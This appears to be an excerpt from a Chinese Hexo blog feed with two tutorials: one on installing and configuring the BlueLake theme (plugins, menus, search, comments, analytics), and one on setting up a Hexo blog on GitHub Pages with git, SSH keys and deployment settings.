<p>在阅读本文之前，假定您已经成功安装了<a href="https://hexo.io/zh-cn/" target="_blank" rel="external">Hexo</a>，并使用 Hexo 提供的命令创建了一个静态博客。Hexo是一个快速、简洁且高效的博客框架。Hexo基于Node.js ，使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
<blockquote><br><p>需要特别注意的是Hexo有两个<code>_config.yml</code>配置文件，一份位于站点根目录下，主要包含 Hexo 站点本身的配置，下文中会称为<strong><code>根_config.yml</code></strong>；另一份位于主题目录下（themes/主题名/_config.yml），这份配置由主题作者提供，主要用于配置主题相关的选项,下文中会称为<strong><code>主题_config.yml</code></strong>。</p><br></blockquote>

<h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><p>您可以直接到<a href="https://github.com/chaooo/hexo-theme-BlueLake" target="_blank" rel="external">BlueLake发布页</a>下载，然后解压拷贝到themes目录下，修改配置即可。<br>不过我还是推荐使用GIT来checkout代码，之后也可以通过git pull来快速更新。</p>
<h4 id="1-1-安装主题"><a href="#1-1-安装主题" class="headerlink" title="1.1 安装主题"></a>1.1 安装主题</h4><p>在根目录下打开终端窗口：</p>
<figure class="highlight bash"><figcaption><span>git bash</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">clone</span> <a href="https://github.com/chaooo/hexo-theme-BlueLake.git" target="_blank" rel="external">https://github.com/chaooo/hexo-theme-BlueLake.git</a> themes/BlueLake</div></pre></td></tr></table></figure>

<p></p><h4 id="1-2-安装主题渲染器"><a href="#1-2-安装主题渲染器" class="headerlink" title="1.2 安装主题渲染器"></a>1.2 安装主题渲染器</h4><p>BlueLake是基于<code>jade</code>和<code>stylus</code>写的，所以需要安装<code>hexo-renderer-jade</code>和<code>hexo-renderer-stylus</code>来渲染。<br><figure class="highlight bash"><figcaption><span>git bash</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-renderer-jade --save</div><div class="line">$ npm install hexo-renderer-stylus --save</div></pre></td></tr></table></figure></p><p></p>
<p></p><h4 id="1-3-启用主题"><a href="#1-3-启用主题" class="headerlink" title="1.3 启用主题"></a>1.3 启用主题</h4><p>打开<code>根_config.yml</code>配置文件，找到theme字段，将其值改为<code>BlueLake</code>(先确认主题文件夹名称是否为BlueLake)。<br><figure class="highlight yml"><figcaption><span>根_config.yml</span><a href="https://hexo.io/zh-cn/docs/configuration.html" target="_blank" rel="external">_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">theme:</span> BlueLake</div></pre></td></tr></table></figure></p><p></p>
<p></p><h4 id="1-4-验证"><a href="#1-4-验证" class="headerlink" title="1.4 验证"></a>1.4 验证</h4><p>首先启动 Hexo 本地站点，并开启调试模式：<br><figure class="highlight bash"><figcaption><span>git bash</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo s --debug</div></pre></td></tr></table></figure></p><p></p>
<p></p><p>在服务启动的过程，注意观察命令行输出是否有任何异常信息，如果你碰到问题，这些信息将帮助他人更好的定位错误。 当命令行输出中提示出：<code>INFO  Hexo is running at <a href="http://0.0.0.0:4000/" target="_blank" rel="external">http://0.0.0.0:4000/</a>. Press Ctrl+C to stop.</code><br>此时即可使用浏览器访问 <code><a href="http://localhost:4000" target="_blank" rel="external">http://localhost:4000</a></code>，检查站点是否正确运行。</p><p></p>
<p></p><h4 id="1-5-更新主题"><a href="#1-5-更新主题" class="headerlink" title="1.5 更新主题"></a>1.5 更新主题</h4><p>今后若主题添加了新功能正是您需要的，您可以直接<code>git pull</code>来更新主题。<br><figure class="highlight bash"><figcaption><span>git bash</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> themes/BlueLake</div><div class="line">git pull</div></pre></td></tr></table></figure></p><p></p>
<p></p><h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h3><h4 id="2-1-配置网站头部显示文字"><a href="#2-1-配置网站头部显示文字" class="headerlink" title="2.1 配置网站头部显示文字"></a>2.1 配置网站头部显示文字</h4><p>打开<code>根_config.yml</code>，找到：<br><figure class="highlight yml"><figcaption><span>根_config.yml</span><a href="https://hexo.io/zh-cn/docs/configuration.html" target="_blank" rel="external">_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attr">title:</span> </div><div class="line"><span class="attr">subtitle:</span> </div><div class="line"><span class="attr">description:</span> </div><div class="line"><span class="attr">author:</span></div></pre></td></tr></table></figure></p><p></p>
<p></p><p><code>title</code>和<code>subtitle</code>分别是网站主标题和副标题，会显示在网站头部；<code>description</code>在网站界面不会显示，内容会加入网站源码的<code>meta</code>标签中，主要用于SEO；<code>author</code>就填写网站所有者的名字，会在网站底部的<code>Copyright</code>处有所显示。</p><p></p>
<p></p><h4 id="2-2-设置语言"><a href="#2-2-设置语言" class="headerlink" title="2.2 设置语言"></a>2.2 设置语言</h4><p>该主题目前有七种语言：简体中文（zh-CN），繁体中文（zh-TW），英语（en），法语（fr-FR），德语（de-DE），韩语 （ko）,西班牙语（es-ES）；例如选用简体中文，在<code>根_config.yml</code>配置如下：<br><figure class="highlight yml"><figcaption><span>根_config.yml</span><a href="https://hexo.io/zh-cn/docs/configuration.html" target="_blank" rel="external">_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">language:</span> zh-CN</div></pre></td></tr></table></figure></p><p></p>
<p></p><h4 id="2-3-设置菜单"><a href="#2-3-设置菜单" class="headerlink" title="2.3 设置菜单"></a>2.3 设置菜单</h4><p>打开<code>主题_config.yml</code>，找到：<br><figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="attr">menu:</span></div><div class="line"><span class="attr">  - page:</span> home</div><div class="line"><span class="attr">    directory:</span> .</div><div class="line"><span class="attr">    icon:</span> fa-home</div><div class="line"><span class="attr">  - page:</span> archive</div><div class="line"><span class="attr">    directory:</span> archives/</div><div class="line"><span class="attr">    icon:</span> fa-archive</div><div class="line">  <span class="comment"># - page: about</span></div><div class="line">  <span class="comment">#   directory: about/</span></div><div class="line">  <span class="comment">#   icon: fa-user</span></div><div class="line"><span class="attr">  - page:</span> rss</div><div class="line"><span class="attr">    directory:</span> atom.xml</div><div class="line"><span class="attr">    icon:</span> fa-rss</div></pre></td></tr></table></figure></p><p></p>
<p></p><p>主题默认是展示四个菜单，即<code>主页home</code>，<code>归档archive</code>，<code>关于about</code>，<code>订阅RSS</code>；about需要手动添加，RSS需要安装插件，若您并不需要，可以直接注释掉。<br>每个页面底部的<code>footer</code>中<code>联系博主</code>的三个图标分别是<code>邮箱</code>，<code>微博主页链接地址</code>，<code>GitHUb个人页链接地址</code>，直接使用<code>主题_config.yml</code>中<code>about页面</code>的配置，若不需要about页面，只需要如下配置就好：<br><figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># About page </span></div><div class="line"><span class="attr">about:</span></div><div class="line"><span class="attr">  email:</span> <span class="comment">## 个人邮箱 </span></div><div class="line"><span class="attr">  weibo_url:</span> <span class="comment">## 微博主页链接地址</span></div><div class="line"><span class="attr">  github_url:</span> <span class="comment">## github主页链接地址</span></div></pre></td></tr></table></figure></p><p></p>
<p></p><h5 id="2-3-1-添加about页"><a href="#2-3-1-添加about页" class="headerlink" title="2.3.1 添加about页"></a>2.3.1 添加about页</h5><p>此主题默认page页面是关于我页面的布局，在根目录下打开命令行窗口，生成一个关于我页面：<br><figure class="highlight bash"><figcaption><span>git bash</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new page <span class="string">&#39;about&#39;</span></div></pre></td></tr></table></figure></p><p></p>
<p></p><p>打开<code>主题_config.yml</code>，补全关于我页面的详细信息：<br><figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># About page </span></div><div class="line"><span class="attr">about:</span></div><div class="line"><span class="attr">  photo_url:</span> <span class="comment">## 头像的链接地址</span></div><div class="line"><span class="attr">  email:</span> <span class="comment">## 个人邮箱 </span></div><div class="line"><span class="attr">  weibo_url:</span> <span class="comment">## 微博主页链接地址</span></div><div class="line"><span class="attr">  weibo_name:</span> <span class="comment">## 微博用户名 </span></div><div class="line"><span class="attr">  github_url:</span> <span class="comment">## github主页链接地址</span></div><div class="line"><span class="attr">  github_name:</span> <span class="comment">## github用户名</span></div></pre></td></tr></table></figure></p><p></p>
<p></p><p>当然您也可以自定义重新布局about页面，只需要修改<code>layout/page.jade</code>模板就好。</p><p></p>
<p></p><h5 id="2-3-2-安装-RSS-订阅-和-sitemap-网站地图-插件"><a href="#2-3-2-安装-RSS-订阅-和-sitemap-网站地图-插件" class="headerlink" title="2.3.2 安装 RSS(订阅) 和 sitemap(网站地图) 插件"></a>2.3.2 安装 RSS(订阅) 和 sitemap(网站地图) 插件</h5><p>在根目录下打开命令行窗口：<br><figure class="highlight bash"><figcaption><span>git bash</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-generator-feed --save</div><div class="line">$ npm install hexo-generator-sitemap --save</div><div class="line">$ npm install hexo-generator-baidu-sitemap --save</div></pre></td></tr></table></figure></p><p></p>
<p></p><p>添加<code>主题_config.yml</code>配置：<br><figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="attr">Plugins:</span></div><div class="line">  hexo-generator-feed</div><div class="line">  hexo-generator-sitemap</div><div class="line">  hexo-generator-baidu-sitemap</div><div class="line"></div><div class="line"><span class="attr">feed:</span></div><div class="line"><span class="attr">  type:</span> atom</div><div class="line"><span class="attr">  path:</span> atom.xml</div><div class="line"><span class="attr">  limit:</span> <span class="number">20</span></div><div class="line"></div><div class="line"><span class="attr">sitemap:</span></div><div class="line"><span class="attr">  path:</span> sitemap.xml</div><div class="line"><span class="attr">baidusitemap:</span></div><div class="line"><span class="attr">  path:</span> baidusitemap.xml</div></pre></td></tr></table></figure></p><p></p>
<p></p><h4 id="2-4-添加本地搜索"><a href="#2-4-添加本地搜索" class="headerlink" title="2.4 添加本地搜索"></a>2.4 添加本地搜索</h4><p>默认本地搜索是用原生JS写的，但还需要HEXO插件创建的JSON数据文件配合。安装插件<a href="https://github.com/alexbruno/hexo-generator-json-content" target="_blank" rel="external">hexo-generator-json-content</a>来创建JSON数据文件：<br><figure class="highlight bash"><figcaption><span>git bash</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install <a href="mailto:hexo-generator-json-content@2.2.0" target="_blank" rel="external">hexo-generator-json-content@2.2.0</a> --save</div></pre></td></tr></table></figure></p><p></p>
<p></p><p>然后在<code>根_config.yml</code>添加配置：<br><figure class="highlight yml"><figcaption><span>根_config.yml</span><a href="https://hexo.io/zh-cn/docs/configuration.html" target="_blank" rel="external">_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="attr">jsonContent:</span></div><div class="line"><span class="attr">  meta:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  pages:</span> <span class="literal">false</span></div><div class="line"><span class="attr">  posts:</span></div><div class="line"><span class="attr">    title:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    date:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    path:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    text:</span> <span class="literal">true</span></div><div class="line"><span class="attr">    raw:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    content:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    slug:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    updated:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    comments:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    link:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    permalink:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    excerpt:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    categories:</span> <span class="literal">false</span></div><div class="line"><span class="attr">    tags:</span> <span class="literal">true</span></div></pre></td></tr></table></figure></p><p></p>
<p></p><p>最后在<code>主题_config.yml</code>添加配置：<br><figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">local_search:</span> <span class="literal">true</span></div></pre></td></tr></table></figure></p><p></p>
<p></p><h4 id="2-5-修改站点图标"><a href="#2-5-修改站点图标" class="headerlink" title="2.5 修改站点图标"></a>2.5 修改站点图标</h4><p>站点图标存放在主题的<code>Source</code>目录下，已经默认为您准备了两张图片。您也可以自己设计站点LOGO。<br>您需要准备一张ico格式并命名为<strong> favicon.ico </strong>，请将其放入hexo目录的<code>source</code>文件夹，建议大小：32px X 32px。<br>您需要为苹果设备添加网站徽标，请命名为<strong> apple-touch-icon.png </strong>的图像放入hexo目录的“source”文件夹中，建议大小为：114px X 114px。<br>(有很多网站都可以在线生成ico格式的图片。)</p><p></p>
<p></p><h4 id="2-6-添加站点关键字"><a href="#2-6-添加站点关键字" class="headerlink" title="2.6 添加站点关键字"></a>2.6 添加站点关键字</h4><p>请在hexo目录的<code>根_config.yml</code>中添加keywords字段，如：<br><figure class="highlight yml"><figcaption><span>根_config.yml</span><a href="https://hexo.io/zh-cn/docs/configuration.html" target="_blank" rel="external">_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Site</span></div><div class="line"><span class="attr">title:</span> Hexo</div><div class="line"><span class="attr">subtitle:</span> 副标题</div><div class="line"><span class="attr">description:</span> 网站简要描述,如：Charles·Zheng<span class="string">&#39;s blog.</span></div><div class="line">keywords: 网站关键字, key, key1, key2, key3</div><div class="line">author: Charles</div><div class="line">language: zh-CN</div></pre></td></tr></table></figure></p><p></p>
<p></p><h4 id="2-7-其他配置"><a href="#2-7-其他配置" class="headerlink" title="2.7 其他配置"></a>2.7 其他配置</h4><p><code>主题_config.yml</code>的其他配置</p><p></p>
<ol><br><li><code>show_category_count</code>——是否显示分类下的文章数。</li><br><li><code>widgets_on_small_screens</code>——是否在小屏显示侧边栏，若<code>true</code>,则侧边栏挂件将显示在底部。<figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml </a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">show_category_count:</span> <span class="literal">true</span> </div><div class="line"><span class="attr">widgets_on_small_screens:</span> <span class="literal">true</span></div></pre></td></tr></table></figure><br></li><br></ol><br><h3 id="3-集成第三方服务"><a href="#3-集成第三方服务" class="headerlink" title="3.集成第三方服务"></a>3.集成第三方服务</h3><h4 id="3-1-添加评论"><a href="#3-1-添加评论" class="headerlink" title="3.1 添加评论"></a>3.1 添加评论</h4><p>目前主题集成六种第三方评论，分别是<a href="http://duoshuo.com" target="_blank" rel="external">多说评论</a>、<a href="https://disqus.com" target="_blank" rel="external">Disqus评论</a>、<a href="https://livere.com" target="_blank" rel="external">来必力评论</a>、<a href="http://www.uyan.cc/" target="_blank" rel="external">友言评论</a>、<a href="https://gentie.163.com/info.html" target="_blank" rel="external">网易云跟帖评论</a>、<a href="http://changyan.kuaizhan.com" target="_blank" rel="external">畅言评论</a>，多说马上就要停止服务了，友言好像也没怎么维护,目前我已把自己的博客评论从多说转移到畅言了，在国内目前<code>网易云跟帖</code>和<code>畅言</code>还不错。但是网易云跟帖不能提供子域名服务，所以github的子域名都不能正常通过；而畅言需要提供ICP备案号，否则只能试用14天。反正都不能正常使用。</p><br><ol><br><li>注册并获得代码。<ul><br><li>若使用<a href="http://duoshuo.com" target="_blank" rel="external">多说评论</a>，注册多说后获得short_name。</li><br><li>若使用<a href="https://disqus.com" target="_blank" rel="external">Disqus评论</a>，注册Disqus后获得short_name。</li><br><li>若使用<a href="https://livere.com" target="_blank" rel="external">来必力评论</a>，注册来必力,获得data-uid。</li><br><li>若使用<a href="http://www.uyan.cc/" target="_blank" rel="external">友言评论</a>，注册友言,获得uid。</li><br><li>若使用<a href="https://gentie.163.com/info.html" target="_blank" rel="external">网易云跟帖评论</a>，注册网易云跟帖,获得productKey。</li><br><li>若使用<a href="http://changyan.kuaizhan.com" target="_blank" rel="external">畅言评论</a>，注册畅言，获得appid，appkey。</li><br></ul><br></li><br><li>配置<code>主题_config.yml</code>：<figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#Cmments</span></div><div class="line"><span class="attr">comment:</span></div><div class="line"><span class="attr">  duoshuo:</span> <span class="comment">## duoshuo_shortname</span></div><div class="line"><span class="attr">  disqus:</span> <span class="comment">## disqus_shortname</span></div><div class="line"><span class="attr">  livere:</span> <span class="comment">## 来必力(data-uid)</span></div><div class="line"><span class="attr">  uyan:</span> <span class="comment">## 友言(uid)</span></div><div class="line"><span class="attr">  cloudTie:</span> <span class="comment">## 网易云跟帖(productKey)</span></div><div class="line"><span class="attr">  changyan:</span> <span class="comment">## 畅言需在下方配置两个参数，此处不填。</span></div><div class="line"><span class="attr">    appid:</span> <span class="comment">## 畅言(appid)</span></div><div class="line"><span class="attr">    appkey:</span> <span class="comment">##畅言(appkey)</span></div></pre></td></tr></table></figure><br></li><br></ol><br><h4 id="3-2-百度统计"><a href="#3-2-百度统计" class="headerlink" title="3.2 百度统计"></a>3.2 百度统计</h4><ol><br><li>登录<a href="http://tongji.baidu.com/" target="_blank" rel="external">百度统计</a>，定位到站点的代码获取页面。</li><br><li>复制<code>//hm.baidu.com/hm.js?</code>后面那串统计脚本id(假设为：8006843039519956000)</li><br><li>配置<code>主题_config.yml</code>:<figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml </a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">baidu_analytics:</span> <span class="number">8006843039519956000</span></div></pre></td></tr></table></figure><br></li><br></ol><br><blockquote><br><p>注意： <code>baidu_analytics</code>不是你的百度<code>id</code>或者百度统计<code>id</code><br>如若使用谷歌统计，配置方法与百度统计类似。</p><br></blockquote><br><h4 id="3-3-卜算子阅读次数统计"><a href="#3-3-卜算子阅读次数统计" class="headerlink" title="3.3 卜算子阅读次数统计"></a>3.3 卜算子阅读次数统计</h4><figure class="highlight yml"><figcaption><span>主题_config.yml</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/_config.yml" target="_blank" rel="external">themes/BlueLake/_config.yml</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">busuanzi:</span> <span class="literal">true</span></div></pre></td></tr></table></figure><br><p>若设置为<code>true</code>将计算文章的阅读量(Hits)，并显示在文章标题下的<code>小手图标</code>旁。</p><br><h4 id="3-4-微博秀"><a href="#3-4-微博秀" class="headerlink" title="3.4 微博秀"></a>3.4 微博秀</h4><p>微博秀挂件的代码放在<code>layout/_widget/weibo.jade</code>下，需要您去<a href="http://open.weibo.com/" target="_blank" rel="external">微博开放平台</a>获取您自己的微博秀代码来替换。</p><br><ol><br><li>登录<a href="http://open.weibo.com/" target="_blank" rel="external">微博开放平台</a>，选择微博秀。</li><br><li>为了与主题风格统一，作如下配置<ul><br><li>基础设置：高<code>400px</code>；勾选宽度自适应；颜色选择<code>白色</code>；</li><br><li>样式设置：主字色<code>#333</code>；链接色<code>#40759b</code>；鼠标悬停色<code>#f7f8f8</code>；</li><br><li>模块设置：去掉<code>标题</code>、<code>边框</code>、<code>粉丝</code>的勾选框，只留<code>微博</code>。</li><br></ul><br></li><br><li>复制代码里<code>src=&quot;&quot;</code>里引号包裹的内容，替换到<code>layout/_widget/weibo.jade</code><figure class="highlight stylus"><figcaption><span>weibo.jade</span><a href="https://github.com/chaooo/hexo-theme-BlueLake/blob/master/layout/_widget/weibo.jade" target="_blank" rel="external">layout/_widget/weibo.jade</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line marked"><span class="selector-class">.widget</span></div><div class="line">  <span class="selector-class">.widget-title</span></div><div class="line">    i(class=<span class="string">&#39;fa fa-weibo&#39;</span>)= <span class="string">&#39; &#39;</span> + __(<span class="string">&#39;新浪微博&#39;</span>)</div><div class="line">  iframe(<span class="attribute">width</span>=<span class="string">&quot;100%&quot;</span>,height=<span class="string">&quot;400&quot;</span>,class=<span class="string">&quot;share_self&quot;</span>,frameborder=<span class="string">&quot;0&quot;</span>,scrolling=<span class="string">&quot;no&quot;</span>,src=<span class="string">&quot;<a href="http://widget.weibo.com/weiboshow/index.php?language=&amp;width=0&amp;height=400&amp;fansRow=2&amp;ptype=1&amp;speed=0&amp;skin=5&amp;isTitle=0&amp;noborder=0&amp;isWeibo=1&amp;isFans=0&amp;uid=1700139362&amp;verifier=85be6061&amp;colors=d6f3f7,ffffff,333,40759b,f7f8f8&amp;dpc=1&quot;" target="_blank" rel="external">http://widget.weibo.com/weiboshow/index.php?language=&amp;width=0&amp;height=400&amp;fansRow=2&amp;ptype=1&amp;speed=0&amp;skin=5&amp;isTitle=0&amp;noborder=0&amp;isWeibo=1&amp;isFans=0&amp;uid=1700139362&amp;verifier=85be6061&amp;colors=d6f3f7,ffffff,333,40759b,f7f8f8&amp;dpc=1&quot;</a></span>)</div></pre></td></tr></table></figure><br>这只是为了和主题的风格统一，当然您也可以自由随意发挥。<blockquote><br><p>注意：最主要是是要把<code>src</code>里<code>uid=</code>和<code>verifier=</code>后面的字段替换为您自己代码里的就好。</p><br></blockquote><br></li><br></ol>


<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>本文主要参考chaooo写的博客<a href="http://chaoo.oschina.io/2016/12/29/BlueLake%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9A%84%E8%AF%A6%E7%BB%86%E9%85%8D%E7%BD%AE.html" target="_blank" rel="external">BlueLake博客主题的详细配置</a></p>
]]></content>
      
        <categories>
            
            <category> Hexo搭建博客网站 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo+Github搭建静态博客]]></title>
      <url>/2017/06/16/Hexo-Github%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><p>在安装hexo之前，必须确认你已经安装了<a href="http://nodejs.org/" target="_blank" rel="external">Node.js</a>和<a href="http://git-scm.com/" target="_blank" rel="external">Git</a>。</p>
<h4 id="1-创建GitHub仓库"><a href="#1-创建GitHub仓库" class="headerlink" title="1.创建GitHub仓库"></a>1.创建GitHub仓库</h4><p>注册GitHub账号，创建一个以”用户名.github.io”命名的仓库，如我的用户名为Introspelliam,那我的仓库名为：<a href="https://github.com/Introspelliam/Introspelliam.github.io" target="_blank" rel="external">Introspelliam.github.io</a>，仓库默有master分支，用于托管生成的静态文件，再新建一个develop(名字自定)分支，用于托管后台文件，方便以后换电脑时后台文件不会丢失。</p>
<h4 id="2-配置Git"><a href="#2-配置Git" class="headerlink" title="2.配置Git"></a>2.配置Git</h4><p>设置Git的用户名和邮件地址（邮箱就是你注册Github时候的邮箱），打开Git Bash,键入：</p>
<pre><code>$ git config --global user.name &quot;username&quot;
$ git config --global user.email &quot;email@example.com&quot;
</code></pre><h4 id="3-本地Git与GitHub建立联系"><a href="#3-本地Git与GitHub建立联系" class="headerlink" title="3.本地Git与GitHub建立联系"></a>3.本地Git与GitHub建立联系</h4><p>这里介绍SSH的配置，先检查电脑是否已经有SSH</p>
<pre><code>$ ls -al ~/.ssh
</code></pre><p>如果不存在就没有关系，如果存在的话，直接删除.ssh文件夹里面所有文件。<br>输入以下指令后，一路回车就好:</p>
<pre><code>$ ssh-keygen -t rsa -C &quot;emailt@example.com&quot;
</code></pre><p>然后键入以下指令：</p>
<pre><code>$ ssh-agent -s
$ ssh-add ~/.ssh/id_rsa
</code></pre><p>如果出现这个错误:Could not open a connection to your authentication agent，则先执行如下命令即可：</p>
<pre><code>$ ssh-agent bash
</code></pre><p>再重新输入指令：</p>
<pre><code>ssh-add ~/.ssh/id_rsa
</code></pre><p>到了这一步，就可以添加SSH key到你的Github账户了。<br>在github上点击你的头像–&gt;Your profile–&gt;Edit profile–&gt;SSH and GPG keys–&gt;New SSH key<br>Title自己随便取，然后这个Key就是刚刚拷贝的，你直接粘贴就好（也可以文本打开id_rsa.pub复制其内容），最后Add SSH key。<br>最后还是测试一下吧，键入以下命令：</p>
<pre><code>$ ssh -T git@github.com
</code></pre><p>你可能会看到有警告，没事，输入“yes”就好。</p>
<h4 id="4-初始化hexo文件夹"><a href="#4-初始化hexo文件夹" class="headerlink" title="4.初始化hexo文件夹"></a>4.初始化hexo文件夹</h4><p>到GitHub的Introspelliam.github.io仓库下，点击Clone or download,复制里面的HTTPS地址。<br>在E盘或是你喜爱的文件夹下，右键Git Bash Here: 键入git clone -b develop &lt;刚复制的地址&gt;</p>
<pre><code>$ git clone -b develop https://github.com/Introspelliam/Introspelliam.github.io.git
$ mkdir Hexo-admin
</code></pre><h3 id="Hexo安装配置"><a href="#Hexo安装配置" class="headerlink" title="Hexo安装配置"></a>Hexo安装配置</h3><h4 id="1-Hexo初始化"><a href="#1-Hexo初始化" class="headerlink" title="1.Hexo初始化"></a>1.Hexo初始化</h4><p>进入Hexo-admin文件夹</p>
<pre><code>$ cd Hexo-admin
</code></pre><p>接下来只需要使用 npm 即可完成 Hexo 的安装:</p>
<pre><code>$ npm install -g hexo-cli
</code></pre><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件:</p>
<pre><code>$ hexo init
$ npm install
</code></pre><p>接下来也可以本地预览博客，执行下列命令,然后到浏览器输入localhost:4000看看。</p>
<pre><code>$ hexo generate
$ hexo server
</code></pre><p>输入Ctrl+C停止服务。</p>
<h4 id="2-Hexo配置"><a href="#2-Hexo配置" class="headerlink" title="2.Hexo配置"></a>2.Hexo配置</h4><p>用编辑器打开 Hexo-admin/ 下的配置文件_config.yml找到：</p>
<pre><code># Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
    type:
    repository:
</code></pre><p>到GitHub的chaooo.github.io仓库下，点击Clone or download,复制里面的HTTPS地址到repository:，添加branch: master。</p>
<pre><code># Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
  type: git
  repository: https://github.com/Introspelliam/Introspelliam.github.io.git
